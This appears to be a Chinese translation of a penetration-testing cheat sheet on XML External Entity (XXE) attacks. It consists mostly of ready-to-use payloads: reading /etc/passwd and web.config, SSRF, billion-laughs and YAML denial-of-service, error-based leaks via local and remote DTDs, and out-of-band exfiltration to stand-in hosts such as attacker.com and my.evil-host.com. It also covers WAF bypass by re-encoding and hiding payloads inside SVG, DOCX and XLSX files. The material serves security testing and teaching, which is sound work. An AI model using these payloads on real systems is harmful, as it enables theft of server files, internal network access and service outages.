[原文文档](README.en.md)

# XML External Entity

> XML外部实体攻击是针对解析XML输入并允许XML实体的应用程序的一种攻击类型。XML实体可用于告诉XML解析器获取服务器上的特定内容。

## 摘要

- [工具](#工具)
- [检测漏洞](#检测漏洞)
- [利用XXE检索文件](#利用xxe检索文件)
    - [经典XXE](#经典xxe)
    - [经典XXE Base64编码](#经典xxe-base64编码)
    - [XXE内的PHP包装器](#xxe内的php包装器)
    - [XInclude攻击](#xinclude攻击)
- [利用XXE执行SSRF攻击](#利用xxe执行ssrf攻击)
- [利用XXE执行拒绝服务](#利用xxe执行拒绝服务)
    - [十亿笑攻击](#十亿笑攻击)
    - [YAML攻击](#yaml攻击)
    - [参数笑攻击](#参数笑攻击)
- [利用基于错误的XXE](#利用基于错误的xxe)
    - [基于错误 - 使用本地DTD文件](#基于错误---使用本地dtd文件)
        - [Linux本地DTD](#linux本地dtd)
        - [Windows本地DTD](#windows本地dtd)
    - [基于错误 - 使用远程DTD](#基于错误---使用远程dtd)
- [利用盲XXE进行带外数据泄露](#利用盲xxe进行带外数据泄露)
    - [基本盲XXE](#基本盲xxe)
    - [带外XXE](#带外xxe)
    - [使用DTD和PHP过滤器的XXE OOB](#使用dtd和php过滤器的xxe-oob)
    - [使用Apache Karaf的XXE OOB](#使用apache-karaf的xxe-oob)
- [WAF绕过](#waf绕过)
    - [通过字符编码绕过](#通过字符编码绕过)
    - [JSON端点上的XXE](#json端点上的xxe)
- [奇特性文件中的XXE](#奇特性文件中的xxe)
    - [SVG内的XXE](#svg内的xxe)
    - [SOAP内的XXE](#soap内的xxe)
    - [DOCX文件内的XXE](#docx文件内的xxe)
    - [XLSX文件内的XXE](#xlsx文件内的xxe)
    - [DTD文件内的XXE](#dtd文件内的xxe)
- [实验室](#实验室)
- [参考资料](#参考资料)

## 工具

- [staaldraad/xxeftp](https://github.com/staaldraad/xxeserv) - 具有FTP支持的XXE负载微型Web服务器
- [lc/230-OOB](https://github.com/lc/230-OOB) - 用于通过FTP检索文件内容和通过[http://xxe.sh/](http://xxe.sh/)生成负载的带外XXE服务器
- [enjoiz/XXEinjector](https://github.com/enjoiz/XXEinjector) - 使用直接和不同带外方法自动利用XXE漏洞的工具
- [BuffaloWill/oxml_xxe](https://github.com/BuffaloWill/oxml_xxe) - 将XXE/XML漏洞利用嵌入到不同文件类型(DOCX/XLSX/PPTX, ODT/ODG/ODP/ODS, SVG, XML, PDF, JPG, GIF)的工具
- [whitel1st/docem](https://github.com/whitel1st/docem) - 在docx,odt,pptx等中嵌入XXE和XSS负载的实用程序
- [bytehope/wwe](https://github.com/bytehope/wwe) - PoC工具(基于wrapwrap和lightyear)演示仅设置了LIBXML_DTDLOAD或LIBXML_DTDATTR标志的PHP中的XXE

## 检测漏洞

**内部实体**: 如果实体在DTD内声明，则称为内部实体。
语法: `<!ENTITY entity_name "entity_value">`

**外部实体**: 如果实体在DTD外声明，则称为外部实体。由`SYSTEM`标识。
语法: `<!ENTITY entity_name SYSTEM "entity_value">`

基本实体测试，当XML解析器解析外部实体时，结果应在`firstName`中包含"John"，在`lastName`中包含"Doe"。实体在`DOCTYPE`元素内定义。

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```

向服务器发送XML负载时，在请求中设置`Content-Type: application/xml`可能会有帮助。

这些是XML中不同类型的实体：

| 类型             | 前缀   | 可使用位置                |
| ---------------- | -------- | --------------------------- |
| 一般实体   | `&name;` | XML文档内容内部 |
| 参数实体 | `%name;` | 仅在DTD内         |

## 利用XXE检索文件

### 经典XXE

我们尝试显示文件`/etc/passwd`的内容。

```xml
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
```

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
```

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
```

:warning: `SYSTEM`和`PUBLIC`几乎是同义词。

```ps1
<!ENTITY % xxe PUBLIC "Random Text" "URL">
<!ENTITY xxe PUBLIC "Any TEXT" "URL">
```

### 经典XXE Base64编码

```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```

### XXE内的PHP包装器

```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<contacts>
  <contact>
    <name>Jean &xxe; Dupont</name>
    <phone>00 11 22 33 44</phone>
    <address>42 rue du CTF</address>
    <zipcode>75000</zipcode>
    <city>Paris</city>
  </contact>
</contacts>
```

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3" >
]>
<foo>&xxe;</foo>
```

### XInclude攻击

当您无法修改**DOCTYPE**元素时，使用**XInclude**来定位

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

## 利用XXE执行SSRF攻击

XXE可以与[SSRF漏洞](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)结合使用来针对网络上的另一个服务。

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://internal.service/secret_pass.txt" >
]>
<foo>&xxe;</foo>
```

## 利用XXE执行拒绝服务

:warning: : 这些攻击可能会终止服务或服务器，不要在生产环境中使用它们。

### 十亿笑攻击

```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```

### YAML攻击

```xml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```

### 参数笑攻击

十亿笑攻击的变体，使用参数实体的延迟解释，由Sebastian Pipping提供。

```xml
<!DOCTYPE r [
  <!ENTITY % pe_1 "<!---->">
  <!ENTITY % pe_2 "&#37;pe_1;<!---->&#37;pe_1;">
  <!ENTITY % pe_3 "&#37;pe_2;<!---->&#37;pe_2;">
  <!ENTITY % pe_4 "&#37;pe_3;<!---->&#37;pe_3;">
  %pe_4;
]>
<r/>
```

## 利用基于错误的XXE

### 基于错误 - 使用本地DTD文件

如果基于错误的泄露是可能的，您仍然可以依赖本地DTD来执行连接技巧。确认错误消息包含文件名的负载。

```xml
<!DOCTYPE root [
    <!ENTITY % local_dtd SYSTEM "file:///abcxyz/">
    %local_dtd;
]>
<root></root>
```

- [GoSecure/dtd-finder](https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md) - 列出DTD并使用这些本地DTD生成XXE负载。

#### Linux本地DTD

Linux系统中已存储的DTD文件简短列表；用`locate .dtd`列出它们：

```xml
/usr/share/xml/fontconfig/fonts.dtd
/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd
/usr/share/xml/svg/svg10.dtd
/usr/share/xml/svg/svg11.dtd
/usr/share/yelp/dtd/docbookx.dtd
```

文件`/usr/share/xml/fontconfig/fonts.dtd`在第148行有一个可注入的实体`%constant`：`<!ENTITY % constant 'int|double|string|matrix|bool|charset|langset|const'>`

最终的负载变为：

```xml
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
    <!ENTITY % constant 'aaa)>
            <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
            <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///patt/&#x25;file;&#x27;>">
            &#x25;eval;
            &#x25;error;
            <!ELEMENT aa (bb'>
    %local_dtd;
]>
<message>Text</message>
```

#### Windows本地DTD

来自[infosec-au/xxe-windows.md](https://gist.github.com/infosec-au/2c60dc493053ead1af42de1ca3bdcc79)的负载。

- 泄露本地文件

  ```xml
  <!DOCTYPE doc [
      <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
      <!ENTITY % SuperClass '>
          <!ENTITY &#x25; file SYSTEM "file://D:\webserv2\services\web.config">
          <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://t/#&#x25;file;&#x27;>">
          &#x25;eval;
          &#x25;error;
        <!ENTITY test "test"'
      >
      %local_dtd;
    ]><xxx>anything</xxx>
  ```

- 泄露HTTP响应

  ```xml
  <!DOCTYPE doc [
      <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
      <!ENTITY % SuperClass '>
          <!ENTITY &#x25; file SYSTEM "https://erp.company.com">
          <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://test/#&#x25;file;&#x27;>">
          &#x25;eval;
          &#x25;error;
        <!ENTITY test "test"'
      >
      %local_dtd;
    ]><xxx>anything</xxx>
  ```

### 基于错误 - 使用远程DTD

**触发XXE的负载**：

```xml
<?xml version="1.0" ?>
<!DOCTYPE message [
    <!ENTITY % ext SYSTEM "http://attacker.com/ext.dtd">
    %ext;
]>
<message></message>
```

**ext.dtd的内容**：

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

**ext.dtd的替代内容**：

```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; leak SYSTEM '%data;:///'>">
%eval;
%leak;
```

让我们分解负载：

1. `<!ENTITY % file SYSTEM "file:///etc/passwd">`
  此行定义一个名为file的外部实体，它引用文件/etc/passwd的内容（一个包含用户帐户详细信息的类Unix系统文件）。
2. `<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">`
  此行定义一个实体eval，它包含另一个实体定义。这个其他实体（error）旨在引用一个不存在的文件，并将文件实体（`/etc/passwd`内容）附加到文件路径的末尾。`&#x25;`是URL编码的'`%`'，用于在实体定义内引用实体。
3. `%eval;`
  此行使用eval实体，这导致实体error被定义。
4. `%error;`
  最后，此行使用error实体，它尝试访问一个包含`/etc/passwd`内容的不存在文件。由于文件不存在，将抛出错误。如果应用程序将错误报告回用户并在错误消息中包含文件路径，则`/etc/passwd`的内容将作为错误消息的一部分泄露，暴露敏感信息。

## 利用盲XXE进行带外数据泄露

有时您不会有结果输出到页面上，但您仍然可以通过带外攻击提取数据。

### 基本盲XXE

测试盲XXE的最简单方法是尝试加载远程资源，例如Burp Collaborator。

```xml
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net/x"> %ext;
]>
<r></r>
```

```xml
<!DOCTYPE root [<!ENTITY test SYSTEM 'http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net'>]>
<root>&test;</root>
```

将`/etc/passwd`的内容发送到"www.malicious.com"，您可能只收到第一行。

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "file:///etc/passwd" >
<!ENTITY callhome SYSTEM "www.malicious.com/?%xxe;">
]
>
<foo>&callhome;</foo>
```

### 带外XXE

> Yunusov, 2013

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://publicServer.com/parameterEntity_oob.dtd">
<data>&send;</data>

存储在http://publicServer.com/parameterEntity_oob.dtd的文件
<!ENTITY % file SYSTEM "file:///sys/power/image_size">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://publicServer.com/?%file;'>">
%all;
```

### 使用DTD和PHP过滤器的XXE OOB

```xml
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://127.0.0.1/dtd.xml">
%sp;
%param1;
]>
<r>&exfil;</r>

存储在http://127.0.0.1/dtd.xml的文件
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://127.0.0.1/dtd.xml?%data;'>">
```

### 使用Apache Karaf的XXE OOB

影响版本的CVE-2018-11788：

- Apache Karaf <= 4.2.1
- Apache Karaf <= 4.1.6

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://27av6zyg33g8q8xu338uvhnsc.canarytokens.com"> %dtd;]
<features name="my-features" xmlns="http://karaf.apache.org/xmlns/features/v1.3.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0">
    <feature name="deployer" version="2.0" install="auto">
    </feature>
</features>
```

将XML文件发送到`deploy`文件夹。

参考: [brianwrf/CVE-2018-11788](https://github.com/brianwrf/CVE-2018-11788)

## WAF绕过

### 通过字符编码绕过

XML解析器使用4种方法来检测编码：

- HTTP Content Type: `Content-Type: text/xml; charset=utf-8`
- 读取字节顺序标记(BOM)
- 读取文档的前几个符号
    - UTF-8 (3C 3F 78 6D)
    - UTF-16BE (00 3C 00 3F)
    - UTF-16LE (3C 00 3F 00)
- XML声明: `<?xml version="1.0" encoding="UTF-8"?>`

| 编码 | BOM      | 示例                             |              |
| -------- | -------- | ----------------------------------- | ------------ |
| UTF-8    | EF BB BF | EF BB BF 3C 3F 78 6D 6C             | ...<?xml     |
| UTF-16BE | FE FF    | FE FF 00 3C 00 3F 00 78 00 6D 00 6C | ...<.?.x.m.l |
| UTF-16LE | FF FE    | FF FE 3C 00 3F 00 78 00 6D 00 6C 00 | ..<.?.x.m.l. |

**示例**: 我们可以使用[iconv](https://man7.org/linux/man-pages/man1/iconv.1.html)将负载转换为`UTF-16`来绕过一些WAF：

```bash
cat utf8exploit.xml | iconv -f UTF-8 -t UTF-16BE > utf16exploit.xml
```

### JSON端点上的XXE

在HTTP请求中尝试将`Content-Type`从**JSON**切换到**XML**，

| Content Type       | 数据                               |
| ------------------ | ---------------------------------- |
| `application/json` | `{"search":"name","value":"test"}` |
| `application/xml`  | `<?xml version="1.0" encoding="UTF-8" ?><root><search>name</search><value>data</value></root>` |

- XML文档必须包含一个根（`<root>`）元素，它是所有其他元素的父元素。
- 数据也必须转换为XML，否则服务器将返回错误。

```json
{
  "errors":{
    "errorMessage":"org.xml.sax.SAXParseException: XML document structures must start and end within the same entity."
  }
}
```

- [NetSPI/Content-Type Converter](https://github.com/NetSPI/Burp-Extensions/releases/tag/1.4)

## 奇特性文件中的XXE

### SVG内的XXE

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls" width="200" height="200"></image>
</svg>
```

**经典**：

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

**通过SVG栅格化的OOB**：

_xxe.svg_:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
<!ELEMENT svg ANY >
<!ENTITY % sp SYSTEM "http://example.org:8080/xxe.xml">
%sp;
%param1;
]>
<svg viewBox="0 0 200 200" version="1.2" xmlns="http://www.w3.org/2000/svg" style="fill:red">
      <text x="15" y="100" style="fill:black">XXE via SVG rasterization</text>
      <rect x="0" y="0" rx="10" ry="10" width="200" height="200" style="fill:pink;opacity:0.7"/>
      <flowRoot font-size="15">
         <flowRegion>
           <rect x="0" y="0" width="200" height="200" style="fill:red;opacity:0.3"/>
         </flowRegion>
         <flowDiv>
            <flowPara>&exfil;</flowPara>
         </flowDiv>
      </flowRoot>
</svg>
```

_xxe.xml_:

```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://example.org:2121/%data;'>">
```

### SOAP内的XXE

```xml
<soap:Body>
  <foo>
    <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]>
  </foo>
</soap:Body>
```

### DOCX文件内的XXE

开放XML文件的格式（在任何.xml文件中注入负载）：

- /_rels/.rels
- [Content_Types].xml
- 默认主文档部分
    - /word/document.xml
    - /ppt/presentation.xml
    - /xl/workbook.xml

然后更新文件`zip -u xxe.docx [Content_Types].xml`

工具: <https://github.com/BuffaloWill/oxml_xxe>

```xml
DOCX/XLSX/PPTX
ODT/ODG/ODP/ODS
SVG
XML
PDF (experimental)
JPG (experimental)
GIF (experimental)
```

### XLSX文件内的XXE

XLSX的结构：

```ps1
$ 7z l xxe.xlsx
[...]
   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2021-10-17 15:19:00 .....          578          223  _rels/.rels
2021-10-17 15:19:00 .....          887          508  xl/workbook.xml
2021-10-17 15:19:00 .....         4451          643  xl/styles.xml
2021-10-17 15:19:00 .....         2042          899  xl/worksheets/sheet1.xml
2021-10-17 15:19:00 .....          549          210  xl/_rels/workbook.xml.rels
2021-10-17 15:19:00 .....          201          160  xl/sharedStrings.xml
2021-10-17 15:19:00 .....          731          352  docProps/core.xml
2021-10-17 15:19:00 .....          410          246  docProps/app.xml
2021-10-17 15:19:00 .....         1367          345  [Content_Types].xml
------------------- ----- ------------ ------------  ------------------------
2021-10-17 15:19:00              11216         3586  9 files
```

提取Excel文件：`7z x -oXXE xxe.xlsx`

重建Excel文件：

```ps1
cd XXE
zip -r -u ../xxe.xlsx *
```

警告：使用`zip -u`（<https://infozip.sourceforge.net/Zip.html>）而不是`7z u` / `7za u`（<https://p7zip.sourceforge.net/>）或`7zz`（<https://www.7-zip.org/>），因为它们不会以相同的方式重新压缩，许多Excel解析库将无法识别它为有效的Excel文件。使用`zip -u`的有效魔术字节签名（`file XXE.xlsx`）将显示为`Microsoft Excel 2007+`，无效的则显示为`Microsoft OOXML`。

在`xl/workbook.xml`中添加您的盲XXE负载。

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE cdl [<!ELEMENT cdl ANY ><!ENTITY % asd SYSTEM "http://x.x.x.x:8000/xxe.dtd">%asd;%c;]>
<cdl>&rrr;</cdl>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
```

或者，在`xl/sharedStrings.xml`中添加您的负载：

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE cdl [<!ELEMENT t ANY ><!ENTITY % asd SYSTEM "http://x.x.x.x:8000/xxe.dtd">%asd;%c;]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="10" uniqueCount="10"><si><t>&rrr;</t></si><si><t>testA2</t></si><si><t>testA3</t></si><si><t>testA4</t></si><si><t>testA5</t></si><si><t>testB1</t></si><si><t>testB2</t></si><si><t>testB3</t></si><si><t>testB4</t></si><si><t>testB5</t></si></sst>
```

使用远程DTD将节省我们每次想要检索不同文件时重建文档的时间。
相反，我们构建文档一次，然后更改DTD。
而使用FTP而不是HTTP允许检索更大的文件。

`xxe.dtd`

```xml
<!ENTITY % d SYSTEM "file:///etc/passwd">
<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://x.x.x.x:2121/%d;'>">
```

使用[staaldraad/xxeserv](https://github.com/staaldraad/xxeserv)提供DTD并接收FTP负载：

```ps1
xxeserv -o files.log -p 2121 -w -wd public -wp 8000
```

### DTD文件内的XXE

上面详细描述的大多数XXE负载需要同时控制DTD或`DOCTYPE`块以及`xml`文件。
在罕见的情况下，您可能只控制DTD文件，而无法修改`xml`文件。例如，MITM。
当您控制的是DTD文件而不是`xml`文件时，XXE仍可能通过此负载实现。

```xml
<!-- 将敏感文件的内容加载到变量中 -->
<!ENTITY % payload SYSTEM "file:///etc/passwd">
<!-- 使用该变量构造带有文件内容的URL的HTTP get请求 -->
<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "http://my.evil-host.com/x=%payload;">'>
%param1;
%external;
```

## 实验室

- [Root Me - XML外部实体](https://www.root-me.org/en/Challenges/Web-Server/XML-External-Entity)
- [PortSwigger XXE实验室](https://portswigger.net/web-security/all-labs#xml-external-entity-xxe-injection)
    - [使用外部实体利用XXE检索文件](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files)
    - [利用XXE执行SSRF攻击](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf)
    - [带有带外交互的盲XXE](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction)
    - [通过XML参数实体进行带外交互的盲XXE](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities)
    - [使用恶意外部DTD泄露数据的盲XXE利用](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration)
    - [通过错误消息检索数据的盲XXE利用](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages)
    - [利用XInclude检索文件](https://portswigger.net/web-security/xxe/lab-xinclude-attack)
    - [通过图像文件上传利用XXE](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload)
    - [通过重新利用本地DTD检索数据的XXE利用](https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd)
- [GoSecure研讨会 - 高级XXE利用](https://gosecure.github.io/xxe-workshop)

## 参考资料

- [XXE注入深度探索 - Trenton Gordon - 2019年7月22日](https://www.synack.com/blog/a-deep-dive-into-xxe-injection/)
- [XXE利用的本地DTD发现自动化 - Philippe Arteau - 2019年7月16日](https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation)
- [UBER上的盲OOB XXE 26+域被黑客攻击 - Raghav Bisht - 2016年8月5日](http://nerdint.blogspot.hk/2016/08/blind-oob-xxe-at-uber-26-domains-hacked.html)
- [CVE-2019-8986：TIBCO JasperReports服务器中的SOAP XXE - Julien Szlamowicz, Sebastien Dudek - 2019年3月11日](https://www.synacktiv.com/ressources/advisories/TIBCO_JasperReports_Server_XXE.pdf)
- [在加固服务器上使用XXE进行数据泄露 - Ritik Singh - 2022年1月29日](https://infosecwriteups.com/data-exfiltration-using-xxe-on-a-hardened-server-ef3a3e5893ac)
- [检测和利用SAML接口中的XXE - Christian Mainka (@CheariX) - 2014年11月6日](http://web-in-security.blogspot.fr/2014/11/detecting-and-exploiting-xxe-in-saml.html)
- [利用文件上传功能中的XXE - Will Vandevanter (@_will_is_) - 2015年11月19日](https://www.blackhat.com/docs/webcast/11192015-exploiting-xml-entity-vulnerabilities-in-file-parsing-functionality.pdf)
- [使用EXCEL利用XXE - Marc Wickenden - 2018年11月12日](https://www.4armed.com/blog/exploiting-xxe-with-excel/)
- [使用本地DTD文件利用XXE - Arseniy Sharoglazov - 2018年12月12日](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)
- [从盲XXE到root级文件读取访问 - Pieter Hiele - 2018年12月12日](https://www.honoki.net/2018/12/from-blind-xxe-to-root-level-file-read-access/)
- [我们如何获得Google生产服务器的读取访问权限 - Detectify - 2014年4月11日](https://blog.detectify.com/2014/04/11/how-we-got-read-access-on-googles-production-servers/)
- [PHP中的不可能XXE - Aleksandr Zhurnakov - 2025年3月11日](https://swarm.ptsecurity.com/impossible-xxe-in-php/)
- [Midnight Sun CTF 2019资格赛 - Rubenscube - jbz - 2019年4月6日](https://jbz.team/midnightsunctfquals2019/Rubenscube)
- [通过SAML的OOB XXE - Sean Melia (@seanmeals) - 2016年1月](https://seanmelia.files.wordpress.com/2016/01/out-of-band-xml-external-entity-injection-via-saml-redacted.pdf)
- [思科和Citrix的有效负载 - Arseniy Sharoglazov - 2016年1月1日](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)
- [渗透测试XXE - @phonexicum - 2020年3月9日](https://phonexicum.github.io/infosec/xxe.html)
- [玩转Content-Type - JSON端点上的XXE - Antti Rantasaari - 2015年4月20日](https://www.netspi.com/blog/technical-blog/web-application-pentesting/playing-content-type-xxe-json-endpoints/)
- [REDTEAM TALES 0X1：SOAPY XXE - 发现并利用SOAP WS中的XXE漏洞 - Optistream - 2024年5月27日](https://www.optistream.io/blogs/tech/redteam-stories-1-soapy-xxe)
- [XML攻击 - Mariusz Banach (@mgeeky) - 2017年12月21日](https://gist.github.com/mgeeky/4f726d3b374f0a34267d4f19c9004870)
- [XML外部实体(XXE)注入 - PortSwigger - 2019年5月29日](https://portswigger.net/web-security/xxe)
- [XML外部实体(XXE)处理 - OWASP - 2019年12月4日](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing)
- [XML外部实体预防备忘单 - OWASP - 2019年2月16日](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [XXE所有东西！！！(包括Apple iOS的Office Viewer) - Bruno Morisson - 2015年8月14日](https://labs.integrity.pt/articles/xxe-all-the-things-including-apple-ioss-office-viewer/)
- [UBER中的XXE读取本地文件 - httpsonly - 2017年1月24日](https://httpsonly.blogspot.hk/2017/01/0day-writeup-xxe-in-ubercom.html)
- [SVG内的XXE - YEO QUAN YANG - 2016年6月22日](https://quanyang.github.io/x-ctf-finals-2016-john-slick-web-25/)
- [XXE负载 - Etienne Stalmans (@staaldraad) - 2016年7月7日](https://gist.github.com/staaldraad/01415b990939494879b4)
- [XXE：如何成为绝地武士 - Yaroslav Babin - 2018年11月6日](https://2017.zeronights.org/wp-content/uploads/materials/ZN17_yarbabin_XXE_Jedi_Babin.pdf)